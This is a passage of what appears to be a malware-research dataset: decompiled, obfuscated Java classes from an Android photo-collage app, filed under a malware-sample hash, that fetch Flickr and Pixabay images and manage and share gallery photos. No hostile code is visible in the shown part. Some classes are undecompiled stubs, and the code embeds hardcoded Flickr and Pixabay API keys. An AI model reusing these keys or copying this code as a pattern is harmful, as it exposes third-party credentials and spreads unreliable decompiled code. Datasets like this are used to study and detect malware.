"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ap.code","public class ap {   private static final String APIKEY_SEARCH_STRING=""&api_key=64c0f179f8aec0444033c8b2c57a7db0"";   private static final String FLICKR_BASE_URL=""http://api.flickr.com/services/rest/?method="";   private static final int FLICKR_GET_SIZES_ID=2;   private static final String FLICKR_GET_SIZES_STRING=""flickr.photos.getSizes"";   private static final int FLICKR_PHOTOS_SEARCH_ID=1;   private static final String FLICKR_PHOTOS_SEARCH_STRING=""flickr.photos.search"";   private static final String FORMAT_STRING=""&format=json"";   private static final int NUMBER_OF_PHOTOS=50;   private static final String PHOTO_ID_STRING=""&photo_id="";   public static final int PHOTO_LARGE=222;   public static final int PHOTO_THUMB=111;   private static final String TAGS_STRING=""&tags="";   public static an.c a;   public static String b=""relevance"";   public static Bitmap a(  ao aoVar){     Bitmap bitmap;     Exception e;     InputStream inputStream;     BufferedInputStream bufferedInputStream;     try {       URLConnection openConnection=new URL(aoVar.f).openConnection();       openConnection.connect();       inputStream=openConnection.getInputStream();       bufferedInputStream=new BufferedInputStream(inputStream);       bitmap=BitmapFactory.decodeStream(bufferedInputStream);     }  catch (    Exception e2) {       bitmap=null;       e=e2;     }     try {       bufferedInputStream.close();       inputStream.close();     }  catch (    Exception e3) {       e=e3;       Log.e(""FlickrManager"",e.getMessage());       return bitmap;     }     return bitmap;   }   public static Bitmap b(  ao aoVar){     Bitmap bitmap;     Exception e;     InputStream inputStream;     BufferedInputStream bufferedInputStream;     try {       URLConnection openConnection=new URL(aoVar.c).openConnection();       openConnection.connect();       inputStream=openConnection.getInputStream();       bufferedInputStream=new BufferedInputStream(inputStream);       bitmap=BitmapFactory.decodeStream(bufferedInputStream);     }  catch (    Exception e2) {       bitmap=null;       e=e2;     }     try {       bufferedInputStream.close();       inputStream.close();     }  catch (    Exception e3) {       e=e3;       Log.e(""FlickrManager"",e.getMessage());       return bitmap;     }     return bitmap;   } public static class a extends Thread {     an.c a;     ao b;     public a(    an.c cVar,    ao aoVar){       this.a=cVar;       this.b=aoVar;     }     @Override public void run(){       this.b.d=ap.b(this.b);       if (this.b.d != null) {         try {           this.a.sendMessage(Message.obtain(this.a,2));         }  catch (        Exception e) {           e.getMessage();         }       }     }   }   public static ArrayList<ao> a(  an.c cVar,  Context context,  String str,  String str2,  String str3,  String str4,  boolean z){     String str5;     a=cVar;     b=str2;     if (z) {       str5=""true"";     }  else {       str5=""false"";     }     String str6=""http://pixabay.com/api/?username=jirasaks9&key=4fdc8fb95e01d2dd977b&search_term="" + dev.camera360.collage.a.d.a(str) + ""&image_type=photo&per_page=""+ str4+ ""&order=""+ str2+ ""&orientation=""+ str3+ ""&editors_choice=""+ str5;     ArrayList<ao> arrayList=new ArrayList<>();     String str7=null;     try {       if (av.a(context)) {         str7=av.a(str6).toString();       }       try {         JSONArray jSONArray=new JSONObject(str7).getJSONArray(""hits"");         for (int i=0; i < jSONArray.length(); i++) {           JSONObject jSONObject=jSONArray.getJSONObject(i);           ao aoVar=new ao(jSONObject.getString(""previewURL""),jSONObject.getString(""webformatURL""),jSONObject.getString(""user""));           aoVar.b=i;           arrayList.add(aoVar);         }         Message obtain=Message.obtain(cVar,0);         obtain.obj=arrayList;         cVar.sendMessage(obtain);       }  catch (      JSONException e) {         e.printStackTrace();       }     }  catch (    NullPointerException e2) {       e2.printStackTrace();     }     return arrayList;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\aq.code","!org.eclipse.jdt.core.dom.TypeDeclaration@6433b188"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ar.code","public class ar extends Dialog {   TabSample a;   final ar b;   protected boolean c;   protected int d;   public void a(){     this.b.dismiss();   }   @Override public boolean onTouchEvent(  MotionEvent motionEvent){     if (motionEvent.getAction() == 0) {       this.c=false;       return true;     }     return true;   }   public ar(  TabSample tabSample,  int i){     super(tabSample,i);     this.c=true;     this.d=10000;     this.a=tabSample;     this.b=this;     requestWindowFeature(1);     setContentView(R.layout.splash);     new Thread(){       @Override public void run(){         int i2=0;         while (ar.this.c && i2 < ar.this.d) {           try {             sleep(100L);             if (ar.this.c) {               i2+=100;             }           }  catch (          InterruptedException e) {             return;           }  finally {             ar.this.a();           }         }       }     } .start();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\array.code","public static final class array {   public static final int category_options=0x7f060016;   public static final int country_options=0x7f060010;   public static final int country_values=0x7f060011;   public static final int feed_options=0x7f060015;   public static final int file_type_extra1_options=0x7f06000a;   public static final int file_type_extra1_values=0x7f06000b;   public static final int file_type_extra2_options=0x7f06000c;   public static final int file_type_extra2_values=0x7f06000d;   public static final int file_type_options=0x7f060008;   public static final int file_type_values=0x7f060009;   public static final int item_per_page_options=0x7f060002;   public static final int item_per_page_values=0x7f060003;   public static final int min_level_options=0x7f060000;   public static final int min_level_values=0x7f060001;   public static final int search_type_options=0x7f060006;   public static final int search_type_values=0x7f060007;   public static final int search_type_youtube_options=0x7f060013;   public static final int time_options=0x7f06000e;   public static final int time_top_youtube_options=0x7f060012;   public static final int time_values=0x7f06000f;   public static final int time_youtube_options=0x7f060014;   public static final int update_freq_options=0x7f060004;   public static final int update_freq_values=0x7f060005; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\as.code","public class as {   String a;   Bitmap b;   int c;   public as(  String str,  Bitmap bitmap){     this.a=str;     this.b=bitmap;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\AsyncTaskC0061a.code","private class AsyncTaskC0061a extends AsyncTask<o,Void,Void> {   private AsyncTaskC0061a(){   }   AsyncTaskC0061a(  a aVar,  AsyncTaskC0061a asyncTaskC0061a){     this();   }   @Override public Void doInBackground(  o... oVarArr){     for (    o oVar : oVarArr) {       if (isCancelled()) {         break;       }       oVar.e=a.this.a(oVar.c);       oVar.d=BaseActivity.a(oVar.c,""png"");       publishProgress(new Void[0]);     }     return null;   }   @Override public void onProgressUpdate(  Void... voidArr){     a.this.a();   }   @Override public void onPostExecute(  Void r2){     ((TabSample)((Activity)a.this.h).getParent()).g();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\at.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5cf330c2"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\attr.code","public static final class attr {   public static final int adSize=0x7f010000;   public static final int adUnitId=0x7f010001;   public static final int animation=0x7f01000a;   public static final int banner_type=0x7f010009;   public static final int canShowMR=0x7f01000c;   public static final int gif=0x7f010005;   public static final int gifMoviewViewStyle=0x7f010007;   public static final int isGoneWithoutAd=0x7f010004;   public static final int keywords=0x7f010002;   public static final int paused=0x7f010006;   public static final int placementType=0x7f01000b;   public static final int test_mode=0x7f010008;   public static final int testing=0x7f010003; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\au.code","!org.eclipse.jdt.core.dom.TypeDeclaration@59bae8af"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\av.code","public class av {   private static int a=5000;   private static int b=Constants.HTTP_TIMEOUT;   public static boolean a(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     return activeNetworkInfo != null && activeNetworkInfo.isConnectedOrConnecting();   }   public static java.io.ByteArrayOutputStream a(  java.lang.String r8){     throw new UnsupportedOperationException(""Method not decompiled: dev.camera360.collage.av.a(java.lang.String):java.io.ByteArrayOutputStream"");   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\aw.code","public class aw extends ArrayAdapter<String> {   static int m;   static int n;   boolean a;   public int b;   public int c;   public int d;   Cursor e;   public String f;   public int g;   public String h;   public String i;   boolean j;   boolean k;   int l;   int o;   SharedPreferences p;   int q;   private o[] r;   private Context s;   private a t;   private int u;   private LayoutInflater v;   private int c(){     int[] intArray=this.s.getResources().getIntArray(R.array.item_per_page_values);     int i=this.p.getInt(BaseActivity.PREF_SETTING_ITEM_PAGE,0);     return intArray[i >= 0 ? i : 0];   }   private void a(  Context context){     Display defaultDisplay=((WindowManager)context.getSystemService(""window"")).getDefaultDisplay();     m=defaultDisplay.getWidth();     n=defaultDisplay.getHeight();   }   public aw(  Context context,  int i,  ArrayList<String> arrayList,  int i2,  boolean z){     super(context,i,arrayList);     this.a=false;     this.b=0;     this.c=0;     this.d=1;     this.h=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER2+ ""/temp/"";     this.i=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER2+ ""/album/"";     this.j=false;     this.k=false;     this.l=4;     this.s=context;     this.p=context.getSharedPreferences(BaseActivity.SEARCH_PREFERENCE,0);     this.q=c();     this.o=i;     this.d=i2;     this.a=z;     TypedArray obtainStyledAttributes=context.obtainStyledAttributes(R.styleable.Gallery1);     this.u=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();     this.v=(LayoutInflater)context.getSystemService(""layout_inflater"");     a(context);     a();   }   public void a(){     b();     this.t=new a(this,null);     try {       this.e=((Activity)this.s).managedQuery(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,new String[]{AnalyticsSQLiteHelper.GENERAL_ID,""_data"",""title"",""_display_name"",""description""},""_display_name LIKE '%C360%'"",null,""date_added DESC"");       int columnIndexOrThrow=this.e.getColumnIndexOrThrow(AnalyticsSQLiteHelper.GENERAL_ID);       int columnIndexOrThrow2=this.e.getColumnIndexOrThrow(""description"");       int columnIndexOrThrow3=this.e.getColumnIndexOrThrow(""_data"");       int columnIndexOrThrow4=this.e.getColumnIndexOrThrow(""_display_name"");       int columnIndexOrThrow5=this.e.getColumnIndexOrThrow(""title"");       this.b=this.e.getCount();       this.c=(int)Math.ceil(this.b / this.q);       int i=(this.d - 1) * this.q;       int i2=this.q + i;       int i3=i2 > this.b ? this.b : i2;       this.r=new o[i3 - i];       int i4=0;       while (i < i3) {         this.e.moveToPosition(i);         int i5=this.e.getInt(columnIndexOrThrow);         this.e.getString(columnIndexOrThrow2);         this.e.getString(columnIndexOrThrow5);         this.e.getString(columnIndexOrThrow4);         String string=this.e.getString(columnIndexOrThrow3);         Uri withAppendedPath=Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,new StringBuilder().append(i5).toString());         this.r[i4]=new o();         this.r[i4].b=withAppendedPath;         this.r[i4].c=string;         this.r[i4].a=i5;         i4++;         i++;       }       this.t.execute(this.r);     }  catch (    Exception e) {     }   }   public void b(){     if (this.t != null && this.t.getStatus() != AsyncTask.Status.FINISHED) {       this.t.cancel(true);     }   }   @Override public int getCount(){     try {       return this.r.length;     }  catch (    Exception e) {       return 0;     }   }   @Override public String getItem(  int i){     return this.r[i].c;   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     o oVar=this.r[i];     if (view == null) {       view=this.v.inflate(this.o,(ViewGroup)null);       view.setTag(new c(view));     }     c cVar=(c)view.getTag();     ImageView a2=cVar.a();     ImageButton d=cVar.d();     ImageButton e=cVar.e();     ImageButton c2=cVar.c();     ImageButton f=cVar.f();     ProgressBar b2=cVar.b();     if (oVar.e == null) {       b2.setVisibility(0);       d.setVisibility(8);       c2.setVisibility(8);       f.setVisibility(8);       e.setVisibility(8);       a2.setVisibility(4);       view.setBackgroundDrawable(null);     }  else {       b2.setVisibility(8);       a2.setVisibility(0);       a2.setImageBitmap(oVar.e);       a2.setScaleType(ImageView.ScaleType.FIT_CENTER);       d.setVisibility(0);       c2.setVisibility(0);       f.setVisibility(0);       e.setVisibility(0);       view.setBackgroundDrawable(null);     }     as asVar=new as(oVar.d,oVar.e);     asVar.c=oVar.a;     f.setTag(asVar);     f.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view2){         try {           as asVar2=(as)view2.getTag();           aw.this.f=asVar2.a;           aw.this.g=asVar2.c;           AlertDialog.Builder builder=new AlertDialog.Builder(aw.this.s);           builder.setTitle(""Delete Camera 360"");           builder.setMessage(""Delete Image from Camera 360?"");           builder.setPositiveButton(""Yes"",new DialogInterface.OnClickListener(){             @Override public void onClick(            DialogInterface dialogInterface,            int i2){               aw.this.s.getContentResolver().delete(Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,String.valueOf(aw.this.g)),null,null);               aw.this.s.getContentResolver().notifyChange(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,null);               ((Cam360AlbumActivity)aw.this.s).d();             }           } );           builder.setNegativeButton(""Cancel"",new DialogInterface.OnClickListener(){             @Override public void onClick(            DialogInterface dialogInterface,            int i2){               dialogInterface.cancel();             }           } );           builder.show();         }  catch (        Exception e2) {           e2.getMessage();         }       }     } );     e.setTag(new as(oVar.d,oVar.e));     e.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view2){         try {           as asVar2=(as)view2.getTag();           BitmapFactory.Options options=new BitmapFactory.Options();           options.inSampleSize=1;           options.inDither=false;           options.inPurgeable=true;           options.inInputShareable=true;           options.inTempStorage=new byte[16384];           Bitmap decodeFile=BitmapFactory.decodeFile(new File(asVar2.a).toString(),options);           TabSample tabSample=(TabSample)((Activity)aw.this.s).getParent();           tabSample.q=new x((Activity)aw.this.s,decodeFile,asVar2.a,aw.m,aw.n,true,R.style.Dialog_Fullscreen,false);           tabSample.q.show();         }  catch (        Exception e2) {           e2.getMessage();         }       }     } );     as asVar2=new as(oVar.d,oVar.e);     asVar2.c=oVar.a;     a2.setTag(asVar2);     a2.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view2){         try {           as asVar3=(as)view2.getTag();           BitmapFactory.Options options=new BitmapFactory.Options();           options.inSampleSize=1;           options.inDither=false;           options.inPurgeable=true;           options.inInputShareable=true;           options.inTempStorage=new byte[16384];           new dev.camera360.collage.b((Activity)aw.this.s,R.style.Dialog_Translucent,BitmapFactory.decodeFile(new File(asVar3.a).toString(),options),asVar3.a,"""",asVar3.c,aw.m,aw.n).show();         }  catch (        Exception e2) {         }       }     } );     c2.setTag(new as(oVar.d,oVar.e));     c2.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view2){         try {           aw.this.a(((as)view2.getTag()).a);         }  catch (        Exception e2) {         }       }     } );     return view;   }   public void d(){     notifyDataSetChanged();   }   public Bitmap b(  String str){     BitmapFactory.Options options=new BitmapFactory.Options();     options.inSampleSize=this.l;     options.inDither=false;     options.inPurgeable=true;     options.inInputShareable=true;     options.inTempStorage=new byte[16384];     try {       File file=new File(str);       if (file.exists()) {         return BitmapFactory.decodeFile(file.toString(),options);       }       return null;     }  catch (    Exception e) {       return null;     }   } private static class c {     private View a;     private ImageView b=null;     private ImageButton c=null;     private ImageButton d=null;     private ImageButton e=null;     private ImageButton f=null;     private ProgressBar g=null;     public c(    View view){       this.a=view;     }     public ImageView a(){       if (this.b == null) {         this.b=(ImageView)this.a.findViewById(R.id.image_view);       }       return this.b;     }     public ProgressBar b(){       if (this.g == null) {         this.g=(ProgressBar)this.a.findViewById(R.id.progressBar1);       }       return this.g;     }     public ImageButton c(){       if (this.c == null) {         this.c=(ImageButton)this.a.findViewById(R.id.zoom_button);       }       return this.c;     }     public ImageButton d(){       if (this.d == null) {         this.d=(ImageButton)this.a.findViewById(R.id.paint_button);       }       return this.d;     }     public ImageButton e(){       if (this.f == null) {         this.f=(ImageButton)this.a.findViewById(R.id.editor_button);       }       return this.f;     }     public ImageButton f(){       if (this.e == null) {         this.e=(ImageButton)this.a.findViewById(R.id.delete_button);       }       return this.e;     }   } public class a extends AsyncTask<o,Void,Void> {     private a(){     }     a(    aw awVar,    a aVar){       this();     }     @Override public Void doInBackground(    o... oVarArr){       for (      o oVar : oVarArr) {         if (isCancelled()) {           break;         }         oVar.e=aw.this.b(oVar.c);         oVar.d=oVar.c;         publishProgress(new Void[0]);       }       return null;     }     @Override public void onProgressUpdate(    Void... voidArr){       aw.this.d();     }     @Override public void onPostExecute(    Void r3){       if ((aw.this.s instanceof Cam360AlbumActivity) && aw.this.a) {         ((Cam360AlbumActivity)aw.this.s).a(aw.this.c);       }     }   }   public void a(  String str){     new b(str).start();   } public class b extends Thread implements DialogInterface.OnCancelListener {     private String b;     private ProgressDialog c;     private boolean d=false;     public void a(    File file,    File file2) throws IOException {       FileInputStream fileInputStream=new FileInputStream(file);       FileOutputStream fileOutputStream=new FileOutputStream(file2);       byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];       while (true) {         int read=fileInputStream.read(bArr);         if (read > 0) {           fileOutputStream.write(bArr,0,read);         }  else {           fileInputStream.close();           fileOutputStream.close();           return;         }       }     }     public void a(    String str) throws IOException {       File file=new File(str);       String substring=str.substring(str.lastIndexOf(""."") + 1);       if (substring.toLowerCase().equals(BaseActivity.EXTENSION2)) {         Intent intent=new Intent(""android.intent.action.SEND"");         Uri parse=Uri.parse(""file://"" + file.getAbsolutePath());         intent.putExtra(""android.intent.extra.SUBJECT"","""");         intent.putExtra(""android.intent.extra.TEXT"","""");         intent.putExtra(""android.intent.extra.STREAM"",parse);         intent.setType(""image/jpeg"");         aw.this.s.startActivity(Intent.createChooser(intent,""Share Image""));         return;       }       if (substring.toLowerCase().equals(""png"")) {         Intent intent2=new Intent(""android.intent.action.SEND"");         Uri parse2=Uri.parse(""file://"" + file.getAbsolutePath());         intent2.putExtra(""android.intent.extra.SUBJECT"","""");         intent2.putExtra(""android.intent.extra.TEXT"","""");         intent2.putExtra(""android.intent.extra.STREAM"",parse2);         intent2.setType(""image/png"");         aw.this.s.startActivity(Intent.createChooser(intent2,""Share Image""));         return;       }       File file2=new File(aw.this.h,BaseActivity.a(str));       if (file2.exists()) {         file2.delete();       }       a(file,file2);       Intent intent3=new Intent(""android.intent.action.SEND"");       Uri parse3=Uri.parse(""file://"" + file2.getAbsolutePath());       intent3.putExtra(""android.intent.extra.SUBJECT"","""");       intent3.putExtra(""android.intent.extra.TEXT"","""");       intent3.putExtra(""android.intent.extra.STREAM"",parse3);       intent3.setType(""image/jpeg"");       aw.this.s.startActivity(Intent.createChooser(intent3,""Share Image""));       try {         file2.deleteOnExit();       }  catch (      Exception e) {         file2.delete();       }     }     public b(    String str){       this.b=str;       this.c=new ProgressDialog(aw.this.s);       this.c.setIndeterminate(true);       this.c.setMessage(aw.this.s.getText(R.string.progress_dialog_sharing_image));       this.c.setCancelable(true);       this.c.setOnCancelListener(this);       this.c.show();     }     @Override public void onCancel(    DialogInterface dialogInterface){       this.d=true;     }     @Override public void run(){       try {         a(this.b);       }  catch (      IOException e) {         this.d=true;       }       if (this.d) {         this.d=false;       }       if (this.c.isShowing()) {         this.c.dismiss();       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\dev.camera360.collage\ax.code","public class ax extends ArrayAdapter<String> {   static int m;   static int n;   boolean a;   public int b;   public int c;   public int d;   public String e;   public String f;   public String g;   public String h;   public String i;   boolean j;   boolean k;   int l;   int o;   File[] p;   SharedPreferences q;   int r;   private o[] s;   private Context t;   private a u;   private int v;   private LayoutInflater w;   private int c(){     int[] intArray=this.t.getResources().getIntArray(R.array.item_per_page_values);     int i=this.q.getInt(BaseActivity.PREF_SETTING_ITEM_PAGE,0);     return intArray[i >= 0 ? i : 0];   }   private void a(  Context context){     Display defaultDisplay=((WindowManager)context.getSystemService(""window"")).getDefaultDisplay();     m=defaultDisplay.getWidth();     n=defaultDisplay.getHeight();   }   public ax(  Context context,  int i,  ArrayList<String> arrayList,  int i2,  boolean z){     super(context,i,arrayList);     this.a=false;     this.b=0;     this.c=0;     this.d=1;     this.f=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER+ ""/album/"";     this.g=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER+ ""/album/"";     this.h=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER3+ ""/temp/"";     this.i=String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + ""/"" + BaseActivity.PARENT_FOLDER3+ ""/album/"";     this.j=false;     this.k=false;     this.l=4;     this.t=context;     this.q=context.getSharedPreferences(BaseActivity.SEARCH_PREFERENCE,0);     this.r=c();     this.o=i;     TypedArray obtainStyledAttributes=context.obtainStyledAttributes(R.styleable.Gallery1);     this.v=obtainStyledAttributes.getResourceId(0,0);     obtainStyledAttributes.recycle();     this.w=(LayoutInflater)context.getSystemService(""layout_inflater"");     a(context);     this.d=i2;     this.a=z;     a();   }   public void a(){     try {       b();       File file=new File(this.i);       if (file.exists()) {         this.p=file.listFiles();         if (this.p != null && this.p.length > 1) {           Arrays.sort(this.p,new Comparator<File>(){             @Override public int compare(            File file2,            File file3){               if (file2.lastModified() < file3.lastModified()) {                 return 1;               }               if (file2.lastModified() == file3.lastModified()) {                 return 0;               }               return -1;             }           } );         }       }       this.b=this.p.length;       this.c=(int)Math.ceil(this.b / this.r);       int i=(this.d - 1) * this.r;       int i2=this.r + i;       int i3=i2 > this.b ? this.b : i2;       this.s=new o[i3 - i];       int i4=0;       while (i < i3) {         this.s[i4]=new o();         this.s[i4].c=this.p[i].getName();         i4++;         i++;       }       this.u=new a(this,null);       this.u.execute(this.s);     }  catch (    Exception e) {     }   }   public void b(){     if (this.u != null && this.u.getStatus() != AsyncTask.Status.FINISHED) {       this.u.cancel(true);     }   }   @Override public int getCount(){     try {       return this.s.length;     }  catch (    Exception e) {       return 0;     }   }   @Override public String getItem(  int i){     return this.s[i].c;   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     o oVar=this.s[i];     if (view == null) {       view=this.w.inflate(this.o,(ViewGroup)null);       view.setTag(new c(view));     }     c cVar=(c)view.getTag();     ProgressBar a2=cVar.a();     ImageView b2=cVar.b();     ImageButton d=cVar.d();     ImageButton f=cVar.f();     ImageButton c2=cVar.c();     ImageButton e=cVar.e();     if (oVar.e == null) {       a2.setVisibility(0);       d.setVisibility(8);       c2.setVisibility(8);       e.setVisibility(8);       f.setVisibility(8);       b2.setVisibility(4);       view.setBackgroundDrawable(null);     }  else {       a2.setVisibility(8);       b2.setVisibility(0);       b2.setImageBitmap(oVar.e);       b2.setScaleType(ImageView.ScaleType.FIT_CENTER);       d.setVisibility(0);       c2.setVisibility(0);       f.setVisibility(0);       e.setVisibility(0);       view.setBackgroundDrawable(null);     }     f.setTag(new as(oVar.d,oVar.e));     f.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view2){         try {           as asVar=(as)view2.getTag();           BitmapFactory.Options options=new BitmapFactory.Options();           options.inSampleSize=1;           options.inDither=false;           options.inPurgeable=true;           options.inInputShareable=true;           options.inTempStorage=new byte[16384];           Bitmap decodeFile=BitmapFactory.decodeFile(new File(ax.this.i,asVar.a).toString(),new BitmapFactory.Options());           TabSample tabSample=(TabSample)((Activity)ax.this.t).getParent();           tabSample.q=new x((Activity)ax.this.t,decodeFile,asVar.a,ax.m,ax.n,true,R.style.Dialog_Fullscreen,false);           tabSample.q.show();         }  catch (        Exception e2) {           e2.getMessage();         }       }     } );     e.setTag(new as(oVar.d,oVar.e));     e.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view2){         try {           as asVar=(as)view2.getTag();           ax.this.e=asVar.a;           AlertDialog.Builder builder=new AlertDialog.Builder(ax.this.t);           builder.setTitle(""Delete Gallery"");           builder.setMessage(""Delete Drawing from Gallery?"");           builder.setPositiveButton(""Yes"",new DialogInterface.OnClickListener(){             @Override public void onClick(            DialogInterface dialogInterface,            int i2){               File file=new File(ax.this.i,ax.this.e);               if (file.exists()) {                 file.delete();               }               ((MomentcamGalleryActivity)ax.this.t).e();             }           } );           builder.setNegativeButton(""Cancel"",new DialogInterface.OnClickListener(){             @Override public void onClick(            DialogInterface dialogInterface,            int i2){               dialogInterface.cancel();             }           } );           builder.show();         }  catch (        Exception e2) {           e2.getMessage();         }       }     } );     b2.setTag(new as(oVar.d,oVar.e));     b2.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view2){         try {           as asVar=(as)view2.getTag();           BitmapFactory.Options options=new BitmapFactory.Options();           options.inSampleSize=1;           options.inDither=false;           options.inPurgeable=true;           options.inInputShareable=true;           options.inTempStorage=new byte[16384];           new au((Activity)ax.this.t,R.style.Dialog_Translucent,BitmapFactory.decodeFile(new File(ax.this.i,asVar.a).toString(),options),asVar.a,"""",ax.m,ax.n).show();         }  catch (        Exception e2) {         }       }     } );     c2.setTag(new as(oVar.d,oVar.e));     c2.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view2){         try {           ax.this.a(((as)view2.getTag()).a);         }  catch (        Exception e2) {         }       }     } );     return view;   }   public void d(){     notifyDataSetChanged();   }   public Bitmap b(  String str){     BitmapFactory.Options options=new BitmapFactory.Options();     options.inSampleSize=this.l;     options.inDither=false;     options.inPurgeable=true;     options.inInputShareable=true;     options.inTempStorage=new byte[16384];     try {       File file=new File(this.i,str);       if (file.exists()) {         return BitmapFactory.decodeFile(file.toString(),options);       }       return null;     }  catch (    Exception e) {       return null;     }   } private static class c {     private View a;     private ImageView b=null;     private ImageButton c=null;     private ImageButton d=null;     private ImageButton e=null;     private ImageButton f=null;     private ProgressBar g=null;     public c(    View view){       this.a=view;     }     public ProgressBar a(){       if (this.g == null) {         this.g=(ProgressBar)this.a.findViewById(R.id.progressBar1);       }       return this.g;     }     public ImageView b(){       if (this.b == null) {         this.b=(ImageView)this.a.findViewById(R.id.image_view);       }       return this.b;     }     public ImageButton c(){       if (this.c == null) {         this.c=(ImageButton)this.a.findViewById(R.id.zoom_button);       }       return this.c;     }     public ImageButton d(){       if (this.d == null) {         this.d=(ImageButton)this.a.findViewById(R.id.paint_button);       }       return this.d;     }     public ImageButton e(){       if (this.e == null) {         this.e=(ImageButton)this.a.findViewById(R.id.delete_button);       }       return this.e;     }     public ImageButton f(){       if (this.f == null) {         this.f=(ImageButton)this.a.findViewById(R.id.editor_button);       }       return this.f;     }   } public class a extends AsyncTask<o,Void,Void> {     private a(){     }     a(    ax axVar,    a aVar){       this();     }     @Override public Void doInBackground(    o... oVarArr){       for (      o oVar : oVarArr) {         if (isCancelled()) {           break;         }         oVar.e=ax.this.b(oVar.c);         oVar.d=oVar.c;         publishProgress(new Void[0]);       }       return null;     }     @Override public void onProgressUpdate(    Void... voidArr){       ax.this.d();     }     @Override public void onPostExecute(    Void r3){       if ((ax.this.t instanceof MomentcamGalleryActivity) && ax.this.a) {         ((MomentcamGalleryActivity)ax.this.t).b(ax.this.c);       }     }   }   public void a(  String str){     new b(str).start();   } public class b extends Thread implements DialogInterface.OnCancelListener {     private String b;     private ProgressDialog c;     private boolean d=false;     public void a(    File file,    File file2) throws IOException {       FileInputStream fileInputStream=new FileInputStream(file);       FileOutputStream fileOutputStream=new FileOutputStream(file2);       byte[] bArr=new byte[android.support.v4.view.a.a.ACTION_NEXT_HTML_ELEMENT];       while (true) {         int read=fileInputStream.read(bArr);         if (read > 0) {           fileOutputStream.write(bArr,0,read);         }  else {           fileInputStream.close();           fileOutputStream.close();           return;         }       }     }     public void a(    String str) throws IOException {       File file=new File(ax.this.i,str);       String substring=str.substring(str.lastIndexOf(""."") + 1);       if (substring.toLowerCase().equals(BaseActivity.EXTENSION2)) {         Intent intent=new Intent(""android.intent.action.SEND"");         Uri parse=Uri.parse(""file://"" + file.getAbsolutePath());         intent.putExtra(""android.intent.extra.SUBJECT"","""");         intent.putExtra(""android.intent.extra.TEXT"","""");         intent.putExtra(""android.intent.extra.STREAM"",parse);         intent.setType(""image/jpeg"");         ax.this.t.startActivity(Intent.createChooser(intent,""Share Image""));         return;       }       if (substring.toLowerCase().equals(""png"")) {         Intent intent2=new Intent(""android.intent.action.SEND"");         Uri parse2=Uri.parse(""file://"" + file.getAbsolutePath());         intent2.putExtra(""android.intent.extra.SUBJECT"","""");         intent2.putExtra(""android.intent.extra.TEXT"","""");         intent2.putExtra(""android.intent.extra.STREAM"",parse2);         intent2.setType(""image/png"");         ax.this.t.startActivity(Intent.createChooser(intent2,""Share Image""));         return;       }       File file2=new File(ax.this.h,BaseActivity.a(str));       if (file2.exists()) {         file2.delete();       }       a(file,file2);       Intent intent3=new Intent(""android.intent.action.SEND"");       Uri parse3=Uri.parse(""file://"" + file2.getAbsolutePath());       intent3.putExtra(""android.intent.extra.SUBJECT"","""");       intent3.putExtra(""android.intent.extra.TEXT"","""");       intent3.putExtra(""android.intent.extra.STREAM"",parse3);       intent3.setType(""image/jpeg"");       ax.this.t.startActivity(Intent.createChooser(intent3,""Share Image""));       try {         file2.deleteOnExit();       }  catch (      Exception e) {         file2.delete();       }     }     public b(    String str){       this.b=str;       this.c=new 